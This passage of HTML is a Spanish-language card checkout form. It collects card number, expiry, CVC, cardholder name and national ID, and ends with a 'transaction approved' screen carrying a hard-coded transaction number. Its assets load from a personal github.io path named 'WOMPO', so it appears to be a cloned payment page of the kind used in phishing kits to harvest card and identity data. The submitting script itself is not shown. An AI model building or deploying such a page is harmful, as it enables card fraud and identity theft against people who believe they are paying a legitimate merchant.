TFIMTcuMTU2N1YyMS41NjIzQzE3LjE1NjcgMjEuMTc1OCAxNy4zMjI1IDIwLjk2MTIgMTcuNjU0IDIwLjk2MTJDMTcuNzYyNiAyMC45NTk2IDE3Ljg3MDQgMjAuOTc5NSAxNy45NzEyIDIxLjAxOTlMMTguMTI3NSAyMC41NDEzQzE4LjAxNTIgMjAuNDk3MSAxNy44Njg5IDIwLjQ3NzYgMTcuNzY2MSAyMC40Nzc2TDE3Ljc2NjQgMjAuNDc4Wk0xMy40Mzg4IDIwLjUzNjJIMTIuNjA5NVYxOS44Mjc4SDEyLjA5NjlWMjAuNTM2MkgxMS42MjM4VjIxLjAwMDNIMTIuMDk2OVYyMi4wNjU1QzEyLjA5NjkgMjIuNjA3MiAxMi4zMDY5IDIyLjkyOTkgMTIuOTA2OCAyMi45Mjk5QzEzLjEyNjkgMjIuOTI5OSAxMy4zODA0IDIyLjg2MTYgMTMuNTQxMiAyMi43NDk0TDEzLjM5NDcgMjIuMzE0NkMxMy4yNDM0IDIyLjQwMjQgMTMuMDc3NiAyMi40NDY2IDEyLjk0NTcgMjIuNDQ2NkMxMi42OTIyIDIyLjQ0NjYgMTIuNjA5NSAyMi4yOTAxIDEyLjYwOTUgMjIuMDU1OFYyMS4wMDA3SDEzLjQzODhWMjAuNTM2MlpNNS44NTY3OCAyMi44NzE3VjIxLjQwNjNDNS44NTY3OCAyMC44NTQ1IDUuNTA1NTIgMjAuNDgzMSA0LjkzOTI3IDIwLjQ3ODJDNC42NDE1OSAyMC40NzMyIDQuMzM0NTIgMjAuNTY1OSA0LjExOTUzIDIwLjg5MzZDMy45NTg2OCAyMC42MzQ2IDMuNzA1MTggMjAuNDc4MiAzLjM0ODgxIDIwLjQ3ODJDMy4wOTk3MiAyMC40NzgyIDIuODU2MzEgMjAuNTUxNCAyLjY2NTc2IDIwLjgyNDlWMjAuNTM2MkgyLjE1ODJWMjIuODcxMUgyLjY2OTc0VjIxLjU3NjVDMi42Njk3NCAyMS4xNzEyIDIuODk0MjUgMjAuOTU1OCAzLjI0MDk2IDIwLjk1NThDMy41ODc2NyAyMC45NTU4IDMuNzQ4MSAyMS4xNzU2IDMuNzQ4MSAyMS41NzE0VjIyLjg3MDlINC4yNjA3N1YyMS41NzYyQzQuMjYwNzcgMjEuMTcwOSA0LjQ5NDggMjAuOTU1NSA0LjgzMTQzIDIwLjk1NTVDNS4xNjgwNSAyMC45NTU1IDUuMzQyOTcgMjEuMTc1MyA1LjM0Mjk3IDIxLjU3MTFWMjIuODcwNkw1Ljg1Njc4IDIyLjg3MTdaIiBmaWxsPSIjMjMxRjIwIi8+CjxwYXRoIGQ9Ik0yOC44MzU1IDE1LjEwNDlWMTQuNzYzMkgyOC43NDY2TDI4LjY0MzggMTQuOTk3N0wyOC41NDE1IDE0Ljc2MzJIMjguNDUyNFYxNS4xMDQ5SDI4LjUxNTVWMTQuODQ3NUwyOC42MTE3IDE1LjA2OTZIMjguNjc3MUwyOC43NzMyIDE0Ljg0NjlWMTUuMTA0OUgyOC44MzU1Wk0yOC4yNzE2IDE1LjEwNDlWMTQuODIxN0gyOC4zODU0VjE0Ljc2NEgyOC4wOTQ3VjE0LjgyMTdIMjguMjA4NVYxNS4xMDQ5SDI4LjI3MTZaIiBmaWxsPSIjRjc5NDEwIi8+CjxwYXRoIGQ9Ik0xOC43NDE1IDE2LjU2ODlIMTEuMDU2MlYyLjc0MDIzSDE4Ljc0MTZWMTYuNTY4OUgxOC43NDE1WiIgZmlsbD0iI0ZGNUYwMCIvPgo8cGF0aCBkPSJNMTEuNTQzIDkuNjU1MUMxMS41NDMgNi44NDk5NSAxMi44NTQ4IDQuMzUxMTEgMTQuODk3NiAyLjc0MDc1QzEzLjM1MTMgMS41MjAwNyAxMS40Mzg5IDAuODU3NTE1IDkuNDY5NzMgMC44NjAzNjFDNC42MTkwNSAwLjg2MDM2MSAwLjY4NzAxMiA0Ljc5Nzg0IDAuNjg3MDEyIDkuNjU1MUMwLjY4NzAxMiAxNC41MTI0IDQuNjE5MDUgMTguNDQ5OCA5LjQ2OTczIDE4LjQ0OThDMTEuNDM4OSAxOC40NTI4IDEzLjM1MTUgMTcuNzkwMyAxNC44OTc3IDE2LjU2OTVDMTIuODU1MSAxNC45NTk0IDExLjU0MyAxMi40NjA0IDExLjU0MyA5LjY1NTFaIiBmaWxsPSIjRUIwMDFCIi8+CjxwYXRoIGQ9Ik0yOS4xMDk0IDkuNjU1MUMyOS4xMDk0IDE0LjUxMjQgMjUuMTc3MyAxOC40NDk4IDIwLjMyNjcgMTguNDQ5OEMxOC4zNTcyIDE4LjQ1MjcgMTYuNDQ0NSAxNy43OTAxIDE0Ljg5NzkgMTYuNTY5NUMxNi45NDEzIDE0Ljk1OTEgMTguMjUzMSAxMi40NjA0IDE4LjI1MzEgOS42NTUxQzE4LjI1MzEgNi44NDk4MSAxNi45NDEzIDQuMzUxMTEgMTQuODk3OSAyLjc0MDc1QzE2LjQ0NDUgMS41MjAwNyAxOC4zNTcyIDAuODU3NTE1IDIwLjMyNjUgMC44NjAzNjFDMjUuMTc3MiAwLjg2MDM2MSAyOS4xMDkyIDQuNzk3ODQgMjkuMTA5MiA5LjY1NTEiIGZpbGw9IiNGNzlFMUIiLz4KPC9nPgo8ZGVmcz4KPGNsaXBQYXRoIGlkPSJjbGlwMF8yNl8xMDM0MiI+CjxyZWN0IHdpZHRoPSIyOC40MjI0IiBoZWlnaHQ9IjIyLjEzOTYiIGZpbGw9IndoaXRlIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgwLjY4NzAxMiAwLjg2MDM1MikiLz4KPC9jbGlwUGF0aD4KPC9kZWZzPgo8L3N2Zz4K"
                                    alt="MasterCard"><img
                                    class="src-components-CardForm-__CardForm__iconCard__qhnLD"
                                    src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iODAwIgogICAgIHdpZHRoPSIxMjAwIgogICAgIHZpZXdCb3g9Ii03NC43IC00MC4yMDQgNjQ3LjQgMjQxLjIyNCI+PGRlZnM+CiAgICA8bGluZWFyR3JhZGllbnQgeDE9IjAiIHkxPSIwIiB4Mj0iMSIgeTI9IjAiCiAgICAgICAgICAgICAgICAgICAgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiCiAgICAgICAgICAgICAgICAgICAgZ3JhZGllbnRUcmFuc2Zvcm09InNjYWxlKDg5LjcyNzkzIC04OS43Mjc5Mykgcm90YXRlKC0yMC4yMTggLjk2NiAtLjQ1NykiCiAgICAgICAgICAgICAgICAgICAgc3ByZWFkTWV0aG9kPSJwYWQiCiAgICAgICAgICAgICAgICAgICAgaWQ9ImIiPgogICAgICAgIDxzdG9wIG9mZnNldD0iMCIKICAgICAgICAgICAgICBzdG9wLWNvbG9yPSIjMjIyMzU3Ii8+CiAgICAgICAgPHN0b3Agb2Zmc2V0PSIxIgogICAgICAgICAgICAgIHN0b3AtY29sb3I9IiMyNTRhYTUiLz4KICAgIDwvbGluZWFyR3JhZGllbnQ+CiAgICA8Y2xpcFBhdGggY2xpcFBhdGhVbml0cz0idXNlclNwYWNlT25Vc2UiCiAgICAgICAgICAgICAgaWQ9ImEiPgogICAgICAgIDxwYXRoIGQ9Ik00MTMuNzQyIDkwLjQzNWMtLjA1Ny00LjQ5NCA0LjAwNS03LjAwMiA3LjA2NS04LjQ5MyAzLjE0NC0xLjUzIDQuMi0yLjUxMSA0LjE4OC0zLjg3OS0uMDI0LTIuMDk0LTIuNTA4LTMuMDE4LTQuODMzLTMuMDU0LTQuMDU2LS4wNjMtNi40MTQgMS4wOTUtOC4yODkgMS45NzFsLTEuNDYxLTYuODM3YzEuODgxLS44NjcgNS4zNjQtMS42MjMgOC45NzYtMS42NTYgOC40NzggMCAxNC4wMjUgNC4xODUgMTQuMDU1IDEwLjY3NC4wMzMgOC4yMzUtMTEuMzkxIDguNjkxLTExLjMxMyAxMi4zNzIuMDI3IDEuMTE2IDEuMDkyIDIuMzA3IDMuNDI2IDIuNjEgMS4xNTUuMTUzIDQuMzQ0LjI3IDcuOTU5LTEuMzk1bDEuNDE5IDYuNjE1Yy0xLjk0NC43MDgtNC40NDMgMS4zODYtNy41NTQgMS4zODYtNy45OCAwLTEzLjU5My00LjI0Mi0xMy42MzgtMTAuMzE0bTM0LjgyNyA5Ljc0NGMtMS41NDggMC0yLjg1My0uOTAzLTMuNDM1LTIuMjg5bC0xMi4xMTEtMjguOTE3aDguNDcybDEuNjg2IDQuNjU5aDEwLjM1M2wuOTc4LTQuNjU5aDcuNDY3bC02LjUxNiAzMS4yMDZoLTYuODk0bTEuMTg1LTguNDMgMi40NDUtMTEuNzE4aC02LjY5Nmw0LjI1MSAxMS43MThtLTQ2LjI4NCA4LjQzLTYuNjc4LTMxLjIwNmg4LjA3M2w2LjY3NSAzMS4yMDZoLTguMDdtLTExLjk0MyAwLTguNDAzLTIxLjI0LTMuMzk5IDE4LjA2Yy0uMzk5IDIuMDE2LTEuOTc0IDMuMTgtMy43MjMgMy4xOGgtMTMuNzM3bC0uMTkyLS45MDZjMi44Mi0uNjEyIDYuMDI0LTEuNTk5IDcuOTY1LTIuNjU1IDEuMTg4LS42NDUgMS41MjctMS4yMDkgMS45MTctMi43NDJsNi40MzgtMjQuOTAzaDguNTMybDEzLjA4IDMxLjIwNmgtOC40NzgiLz48L2NsaXBQYXRoPgo8L2RlZnM+CiAgICA8ZyBjbGlwLXBhdGg9InVybCgjYSkiCiAgICAgICB0cmFuc2Zvcm09Im1hdHJpeCg0Ljk4NDY5IDAgMCAtNC45ODQ2OSAtMTgwNC44MiA1MDIuMjAyKSI+CiAgICAgICAgPHBhdGggZD0ibTAgMCA5OC40MzcgMzYuMjUyIDIyLjM5NC02MC44MDktOTguNDM2LTM2LjI1MiIgZmlsbD0idXJsKCNiKSIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMzUxLjYxMSA5Ni44OTYpIi8+PC9nPjwvc3ZnPgo="
                                    alt="Visa"><img
                                    class="src-components-CardForm-__CardForm__iconCard__qhnLD"
                                    src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MDQgNTA0IiBzdHlsZT0iZW5hYmxlLWJhY2tncm91bmQ6bmV3IDAgMCA1MDQgNTA0IiB4bWw6c3BhY2U9InByZXNlcnZlIj48cGF0aCBzdHlsZT0iZmlsbDojZmZmIiBkPSJNNDUzLjc5IDQzMmgtMzYwVjcyaDM2MHYzNjB6Ii8+PHBhdGggZD0iTTQ1MCA0NTB2LTYyLjc1aC00Ny43OGwtMjQuNTktMjcuMi0yNC43MiAyNy4ySDE5NS4zOVYyNjAuNWgtNTAuODRsNjMuMDYtMTQyLjcxaDYwLjgybDIxLjcxIDQ4Ljg5di00OC44OWg3NS4yOGwxMy4wNyAzNi44NCAxMy4xNS0zNi44NEg0NTBWNTRINTR2Mzk2aDM5NnptLTM5LjczLTc4LjYySDQ1MGwtNTIuNTUtNTUuNzNMNDUwIDI2MC41NmgtMzkuMWwtMzIuNDUgMzUuNDYtMzIuMTQtMzUuNDZoLTM5Ljc0bDUyLjI0IDU1LjQxLTUyLjI0IDU1LjQxaDM4LjYzbDMyLjYxLTM1Ljc4IDMyLjQ2IDM1Ljc4em05LjMtNTUuNjhMNDUwIDM0OC4wOFYyODMuNmwtMzAuNDMgMzIuMXptLTE3Ny4xMSAzMC4wM3YtMTcuMjZoNjIuNTN2LTI1LjAxaC02Mi41M3YtMTcuMjVoNjQuMTJ2LTI1LjY1aC05NC4zNnYxMTAuODJoOTQuMzZ2LTI1LjY1aC02NC4xMnptMTc3LjYyLTEwMS4yNUg0NTBWMTMzLjY1aC00Ni41NWwtMjQuODYgNjkuMDMtMjQuNy02OS4wM2gtNDcuMzR2MTEwLjgyaDI5LjkyVjE2Ni45bDI4LjUgNzcuNThoMjYuNmwyOC41LTc3Ljc0djc3Ljc0aC4wMXptLTE0Ny41NiAwaDM0LjA0bC00OC45Mi0xMTAuODJIMjE4LjdsLTQ4LjkyIDExMC44MmgzMy4yNWw5LjE4LTIyLjE2aDUwLjk4bDkuMzMgMjIuMTZ6bS0xOS43OC00Ny4wMmgtMzAuMDhsMTUuMDQtMzYuMjUgMTUuMDQgMzYuMjV6IiBzdHlsZT0iZmlsbDojMDA3OWMxIi8+PC9zdmc+"
                                    alt="American Express">
                            </div>
                        </div>

                        <div class="input-group"><label
                                class="src-components-CardForm-__CardForm__label__4OoUX"
                                for="cardNumber">Número de la tarjeta</label><input
                                class="src-components-CardForm-__CardForm__inputCard__5JS59 undefined"
                                id="cardNumber" name="cardNumber" type="tel" inputmode="numeric"
                                pattern="[0-9]*" maxlength="16" autocomplete="cc-number" value=""
                                oninput="formatearYAgregarClase()">
                            <div id="errorCardNumber" class="input-error" aria-live="polite"></div>
                        </div>
                        <div class="src-components-CardForm-__CardForm__bottomWrapper__YdwdS">
                            <div class="src-components-CardForm-__CardForm__panelExpiration__Oa8if"><label
                                    class="src-components-CardForm-__CardForm__label__4OoUX"
                                    for="expirationMonth" aria-hidden="true">Expira el</label>
                                <div class="src-components-CardForm-__CardForm__inputsFlexWrapper__0WDLr">
                                    <div class="custom-select"><select id="expirationMonth"
                                            name="expirationMonth">
                                            <option value="-1" disabled selected>Mes</option>
                                            <option value="01">01</option>
                                            <option value="02">02</option>
                                            <option value="03">03</option>
                                            <option value="04">04</option>
                                            <option value="05">05</option>
                                            <option value="06">06</option>
                                            <option value="07">07</option>
                                            <option value="08">08</option>
                                            <option value="09">09</option>
                                            <option value="10">10</option>
                                            <option value="11">11</option>
                                            <option value="12">12</option>
                                        </select></div><span
                                        class="src-components-CardForm-__CardForm__expirationSeparator__vhlqu"></span>
                                    <div class="custom-select"><select id="expirationYear"
                                            name="expirationYear">
                                            <option value="-1" disabled selected>Año</option>
                                            <option value="23">23</option>
                                            <option value="24">24</option>
                                            <option value="25">25</option>
                                            <option value="26">26</option>
                                            <option value="27">27</option>
                                            <option value="28">28</option>
                                            <option value="29">29</option>
                                            <option value="30">30</option>
                                            <option value="31">31</option>
                                            <option value="32">32</option>
                                            <option value="33">33</option>
                                            <option value="34">34</option>
                                            <option value="35">35</option>
                                            <option value="36">36</option>
                                            <option value="37">37</option>
                                        </select></div>
                                </div>
                                <div id="errorExpirationMonth" class="input-error" aria-live="polite"></div>
                                <div id="errorExpirationYear" class="input-error" aria-live="polite"></div>
                            </div>
                            <div class="src-components-CardForm-__CardForm__panelSecurityCode__G1GF3"><label
                                    class="src-components-CardForm-__CardForm__label__4OoUX" for="code">
                                    <div class="rs-m-block">CVC <span
                                            class="src-components-CardForm-__CardForm__securityCodeMiniLabel__Hf+bT">(Cód.
                                            Seguridad)</span></div>
                                    <div class="rs-m-hidden-block">CVC (Código de seguridad)</div>
                                </label>
                                <div class="src-components-CardForm-__CardForm__inputsFlexWrapper__0WDLr">
                                    <input id="code" name="code" type="tel" maxlength="4" pattern="[0-9]*"
                                        inputmode="numeric" autocomplete="cc-csc"
                                        class="src-components-CardForm-__CardForm__inputCode__EBEB+"
                                        placeholder="" value="">

                                    <div id="verCVV"
                                        class="src-components-CardForm-__CardForm__toggleCodeTooltip__wO-dQ">
                                        <span
                                            class="src-components-CardForm-__CardForm__toggleCodeTooltipLabel__6EJQv">¿Cómo
                                            encuentro mi código de seguridad?</span>
                                    </div>
                                </div>
                                <div id="errorCode" class="input-error" aria-live="polite"></div>
                                <div class="input-group"></div>
                            </div>
                        </div>

                        <div id="infoCVV"
                            class="src-components-CardForm-__CardForm__securityCodeTooltip__Z9sPr"
                            style="display: none;">
                            <div>
                                <div id="cerrarInfoCVV"
                                    class="src-components-CardForm-__CardForm__buttonCloseTooltip__FDI9c">
                                    <img
                                        src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik00IDE5LjcwN0w0LjcwNyAyMC40MTRMMTIuMjA3IDEyLjkxNEwxOS43MDcgMjAuNDE0TDIwLjQxNCAxOS43MDdMMTIuOTE0IDEyLjIwN0wyMC40MTQgNC43MDdMMTkuNzA3IDRMMTIuMjA3IDExLjVMNC43MDcgNEw0IDQuNzA3TDExLjUgMTIuMjA3TDQgMTkuNzA3WiIgZmlsbD0iIzJDMkEyOSIvPgo8L3N2Zz4K">
                                </div>
                                <div class="src-components-CardForm-__CardForm__cardImages__hG3nk">
                                    <div class="src-components-CardForm-__CardForm__card_box__VdgvS">
                                        <p>Tarjetas <strong>Visa y MasterCard </strong>encontrarás el código
                                            de<strong><br> (3 dígitos) el reverso de tu tarjeta.</strong>
                                        </p><img
                                            src="https://itsmariodev.github.io/WOMPO/img/lastd.svg"
                                            alt="Mastercard">
                                           
                                    </div>
                                    <div class="src-components-CardForm-__CardForm__card_box__VdgvS">
                                        <p>Tarjetas <strong>American Express </strong>encontrarás el código
                                            de<strong> (4 dígitos) en el frente de tu tarjeta. </strong></p>
                                        <img src=" https://itsmariodev.github.io/WOMPO/img/cvv.svg"
                                            alt="Card">
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="input-group"><label
                                class="src-components-CardForm-__CardForm__label__4OoUX" for="name">Nombre
                                en la tarjeta</label><input
                                class="src-components-CardForm-__CardForm__input__pwmqf" id="cardHolder"
                                name="cardHolder" type="text" autocomplete="cc-name" value="">
                            <div id="errorCardHolder" class="input-error" aria-live="polite"></div>
                        </div>
                        <div class="input-group"><label for="fullName">Identificación del
                                tarjetahabiente</label>
                            <div
                                class="src-components-LegalDocumentInput-__LegalDocumentInput__idInputGroup__Cmaxb">
                                <div class="custom-select" style="margin-right: 0.5em;"><select id="typeDni"
                                        name="type"
                                        class="src-components-LegalDocumentInput-__LegalDocumentInput__typeList__1dmXJ"
                                        style="width: 4.75em;">
                                        <option value="-1" disabled selected>Tipo</option>
                                        <option value="CC">CC - Cédula de Ciudadanía</option>
                                        <option value="CE">CE - Cédula de Extranjería</option>
                                        <option value="NIT">NIT - Número de Identificación Tributaria
                                        </option>
                                        <option value="PP">PP - Pasaporte</option>
                                        <option value="TI">TI - Tarjeta de Identidad</option>
                                        <option value="DNI">DNI - Documento Nacional de Identidad</option>
                                        <option value="RG">RG - Carteira de Identidade / Registro Geral
                                        </option>
                                        <option value="OTHER">Otro</option>
                                    </select></div><input
                                    class="src-components-LegalDocumentInput-__LegalDocumentInput__input__Fw0rO"
                                    id="legal_id_number" name="legal_id_number" type="text"
                                    autocomplete="legal-id" placeholder="Ingresa tu documento"
                                    maxlength="30" minlength="4" disabled="" value="">
                            </div>
                            <div id="errorTypeDni" class="input-error" aria-live="polite"></div>
                            <div id="errorLegalIdNumber" class="input-error" aria-live="polite"></div>
                        </div>
                        <div class="input-group"><label
                                class="src-components-CardForm-__CardForm__label__4OoUX" for="name">Número
                                de cuotas</label>
                            <div class="custom-select"><select
                                    class="src-components-CardForm-__CardForm__installmentsInput__A0yuH"
                                    id="installments" name="installments">
                                    <option value="1">1</option>
                                    <option value="2">2</option>
                                    <option value="3">3</option>
                                    <option value="4">4</option>
                                    <option value="5">5</option>
                                    <option value="6">6</option>
                                    <option value="7">7</option>
                                    <option value="8">8</option>
                                    <option value="9">9</option>
                                    <option value="10">10</option>
                                    <option value="11">11</option>
                                    <option value="12">12</option>
                                    <option value="13">13</option>
                                    <option value="14">14</option>
                                    <option value="15">15</option>
                                    <option value="16">16</option>
                                    <option value="17">17</option>
                                    <option value="18">18</option>
                                    <option value="19">19</option>
                                    <option value="20">20</option>
                                    <option value="21">21</option>
                                    <option value="22">22</option>
                                    <option value="23">23</option>
                                    <option value="24">24</option>
                                    <option value="25">25</option>
                                    <option value="26">26</option>
                                    <option value="27">27</option>
                                    <option value="28">28</option>
                                    <option value="29">29</option>
                                    <option value="30">30</option>
                                    <option value="31">31</option>
                                    <option value="32">32</option>
                                    <option value="33">33</option>
                                    <option value="34">34</option>
                                    <option value="35">35</option>
                                    <option value="36">36</option>
                                </select></div>
                        </div>
                        <div><label for="acceptance" class="acceptance-checkbox-wrapper false"><input
                                    id="acceptance" name="hasAcceptedContract" type="checkbox"><span
                                    class="src-components-AcceptTerms-__AcceptTermsAndSubmit__acceptanceText__1-Oae">Acepto
                                    haber leído los <a target="_blank"
                                        href="#">términos
                                        y condiciones y la política de privacidad</a> para hacer este
                                    pago.</span></label>


                            <button id="nextCard" type="button" onclick="sendData()"
                                class="submit-button padding_button button-main true false src-components-AcceptTerms-__AcceptTermsAndSubmit__buttonSubmit__T0v+t undefined"
                                disabled="">
                                <div id="btnDefault"
                                    class="src-components-AcceptTerms-__AcceptTermsAndSubmit__boxButton__Vr3fH">
                                    <div
                                        class="src-components-AcceptTerms-__AcceptTermsAndSubmit__boxButton__Vr3fH ">
                                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none"
                                            xmlns="http://www.w3.org/2000/svg">
                                            <path fill-rule="evenodd" clip-rule="evenodd"
                                                d="M12 1.89001L4 5.16001V11.15C4 15.25 6.25 19 9.86 20.92L12 22.07L14.14 20.93C17.75 19 20 15.25 20 11.15V5.16001L12 1.89001ZM19 11.15C19 14.88 16.96 18.29 13.66 20.04L12 20.93L10.34 20.04C7.04 18.29 5 14.88 5 11.15V5.84001L12 2.98001L19 5.84001V11.15ZM7.5 11.5C7.5 13.98 9.52 16 12 16C14.48 16 16.5 13.98 16.5 11.5C16.5 9.02 14.48 7 12 7C9.52 7 7.5 9.02 7.5 11.5ZM15.5 11.5C15.5 13.43 13.93 15 12 15C10.07 15 8.5 13.43 8.5 11.5C8.5 9.57 10.07 8 12 8C13.93 8 15.5 9.57 15.5 11.5ZM9.79004 11.5L10.5 10.79L11.5 11.79L13.5 9.79004L14.21 10.5L11.5 13.21L9.79004 11.5Z"
                                                fill="#CCCCCC"></path>
                                        </svg>
                                    </div>
                                    <span>Continuar con tu pago</span>
                                </div>

                                <span id="verificandoCc" style="display: none;">
                                    <div
                                        class="src-components-Loaders-__ButtonSpinner__buttonSpinner__vmE8f">
                                        <div></div>
                                        <div></div>
                                        <div></div>
                                        <div></div>
                                    </div> Verificando la tarjeta
                                </span>

                                <span id="realizandoPagoCc" style="display: none;">
                                    <div
                                        class="src-components-Loaders-__ButtonSpinner__buttonSpinner__vmE8f">
                                        <div></div>
                                        <div></div>
                                        <div></div>
                                        <div></div>
                                    </div> Realizando el pago
                                </span>
                            </button>

                            <button style="display: none;"
                                class="submit-button padding_button button-main false is-loading src-components-AcceptTerms-__AcceptTermsAndSubmit__buttonSubmit__T0v+t false"
                                disabled=""><span>
                                    <div
                                        class="src-components-Loaders-__ButtonSpinner__buttonSpinner__vmE8f">
                                        <div></div>
                                        <div></div>
                                        <div></div>
                                        <div></div>
                                    </div> Verificando la tarjeta
                                </span></button>

                        </div>
                    </form>
                </div>
            </div>


        </div>


    </div>

    <div id="finalizando" class="src-components-App-__App__contentSection__NXGfR" style="display: none;">
        <div class="src-components-App-__App__contentContainer__xY6Uv">
            <div class="src-components-App-__App__viewTitle__Vm1q6  undefined">
                <span class="src-components-App-__App__title__BrHES">Confirmando tu pago</span>
            </div>
            <div class="src-components-App-__App__routeWrapper__1ZgBl">
                <div>
                    <div>
                        <div class="loader-spinner">
                            <div class="src-components-Loaders-__LoaderSpinner__loaderSpinner__s5JR+"></div>
                        </div>
                        <p class="long-polling-text">Espera unos momentos mientras <strong>procesamos tu
                                transacción</strong>.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="aprobada" class="src-components-App-__App__contentSection__NXGfR" style="display: none;">
        <div class="src-components-App-__App__contentContainer__xY6Uv">
            <div class="src-components-App-__App__viewTitle__Vm1q6  ">
                <div class="src-components-Summary-__Summary__iconWrapper__7pHHV">
                    <div
                        class="src-components-Summary-__Summary__icon__8OzAc src-components-Summary-__Summary__approved__EJcfn">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 56 56">
                            <circle cx="27.9989" cy="28.0003" r="19.6"></circle>
                            <path fill-rule="evenodd" clip-rule="evenodd"
                                d="M27.9998 4.66669C15.1132 4.66669 4.6665 15.1134 4.6665 28C4.6665 40.8867 15.1132 51.3334 27.9998 51.3334C40.8865 51.3334 51.3332 40.8867 51.3332 28C51.3332 15.1134 40.8865 4.66669 27.9998 4.66669ZM42.8935 19.4167L41.1062 17.9167L24.2968 37.9424L14.8229 28.5124L13.1768 30.1662L24.4528 41.3896L42.8935 19.4167Z">
                            </path>
                        </svg></div>
                </div><span class="src-components-App-__App__title__BrHES">Transacción aprobada</span>
            </div>
            <div class="src-components-App-__App__routeWrapper__1ZgBl">
                <div class="src-components-Summary-__Summary__summaryWrapper__qB5yT">
                    <div>
                        <div class="src-components-Summary-__Summary__transactionSummary__hMC+H"></div>
                        <table class="src-components-Summary-__Summary__transactionInfo__jQ4QE">
                            <tbody>
                                <tr>
                                    <td class="src-components-Summary-__Summary__subSection__MaFZ4 src-components-Summary-__Summary__approved__EJcfn"
                                        colspan="2">Información de la transacción</td>
                                </tr>
                                <tr>
                                    <td class="src-components-Summary-__Summary__property__ZsSvz">
                                        Transacción #</td>
                                    <td>113520-1692514145-52541</td>
                                </tr>
                                <tr>
                                    <td class="src-components-Summary-__Summary__property__ZsSvz">Referencia
                                    </td>
                                    <td>66qcRi_1692513876_0OR1VYdBx</td>
                                </tr>
                                <tr>
                                    <td class="src-components-Summary-__Summary__property__ZsSvz">Email</td>
                                    <td id="emailCockie"></td>
                                </tr>
                                <tr>
                                    <td class="src-components-Summary-__Summary__subSection__MaFZ4 src-components-Summary-__Summary__approved__EJcfn"
                                        colspan="2">Información del pagador</td>
                                </tr>
                                <tr>
                                    <td class="src-components-Summary-__Summary__property__ZsSvz">Nombre
                                    </td>
                                    <td id="nameCockie"></td>
                                </tr>
                                <tr>
                                    <td class="src-components-Summary-__Summary__property__ZsSvz">Teléfono
                                    </td>
                                    <td id="phoneCockie"></td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                    <div class="">
                        <div class="print hide-for-printing">Imprimir comprobante - <a
                                href="#">Volver</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

</div>


<div id="footer" class="src-components-SecureTransferFooter-__SecureTransferFooter__container__DMtoU">
    <div>
        <img class="src-components-SecureTransferFooter-__SecureTransferFooter__financialInstitution__t8AzZ src-components-SecureTransferFooter-__SecureTransferFooter__desktop__h9dve"
            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN8AAAA+CAYAAACr4c4LAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAqQSURBVHgB7ZxZVhtJFoZDeOKt5A20k+4FoKoNOKnj6aksegGN8AIa4Q0geQNALaAsb6AQbx4LsQLLKyBrBciPxoPq/5MbqlA4JwlSkl33OydPpiJjuDHciBs3EoxRFEVRFEVRFEVRFEVRFEVRFEVRFEVRFEVRFEVRFEVRFEVRFEVRFEVRFEVRFEVRFEVRvgMqRlG+Qx48eMBb+Pnz59UrV64cPn/+PDILxkIpXxiG1eXl5eqXL19qw+HwVqVSGbx8+fKZUS4M2pa36vXr18OlpaX+Ig7GJO7evctbDQpUhcy9CdJsYvz8JkGnZ2dn/+71egOzQFw1c4KKxoEgShYiqIYrgOLF7xEW3zGDHRcZKIgXMFukDyTPKu5VyYuN/g6/u69eveqbfxDOCrAj7TzE8yPcO2ZBsRPFtWvXWrhvSF8+xXOvYBYcPP9zfjOvulmwOs9M+WRVq6Pja2jMhwgKGG6VLA0oUwO3lskB8Rhnw83Ty7uO3zuYFTuYRdvfysx/UdDebASreN8EUBTe1iHzlpkCpBvidowrtGHo855ZMJbMDOCqhAY9gYI8lQYNJki+YS4RlN+AHEecDIzyXYKtisFK2cK1iauD/v55ESfbma18NB3MbOmj4ftSdmjGFT64ceNGA/c9o3yXYHvBW8cssHk9E+XjrHPv3r3IZKx4UBTuy6gs7+Te//jxY3SBTfIhOqBlf6D8jhlfRVf9BNY0tvtGhkFx/6QsmE27JgOYs3QK1GhW4+cPNi2cG708R4Frktu04D3S95KcI7AkuLcNrYw2bp6MOTLwxr0R26hm88V1kucttE4RXLdxrUgdKNNbyB/v2W3+qCfbqJ4Ux+Tg7F/d9F/V248n/dCxZXiyrFqZpa9PispzUWbpcKENHtgfomxsNCracdmOEJTXQ+OOlA+D9737HgPoiCuk7/CxyOSx7Xa0OI22kHeTKzvT+ukQtsO06NA1v0Pd9IhXTdj/bn369GkN90hk5ADfpeIlyLglMrYm9RAjHW8tXDtJ71HeHsp+isnwsZ0MHe/pqP4paYfIv83ntHraOJC7bVJAHCpI3EcJ9abCjEzLhH0unUx815GJglufVkqbsyy2yS7keWxKZGbKh4bfQ0V/oBKYDGWTVcDOSHTOcMCxYwNcjWmOHpinOHlGoLOOzGQEuA7u3Lmz9vr16x4DMPBotm7kOY3MuRf3LeRYcQYvBy5lqGWkj2xZonhHOeZ7gKtz//79my9evChkUiPfCvrkjzyHDN5vQt4a5P6ZdcAzg5vmfJBnJjXiMMuIFysLJ4+0/s2RbwXt+wdk+ynPUkJdeUP3L+Vtg7Y5KZWpgDNTPlG2dT/cHhFA2W7bvVnSCkLQcA3ciirfBgbWbXm2ChyvuGj4NgbnoRd/G9eBPHO/OJCBHh+B2EhIywHXSyrQMZ3jMj1FobIxbYs/8Lxj/jbv3PQRLt45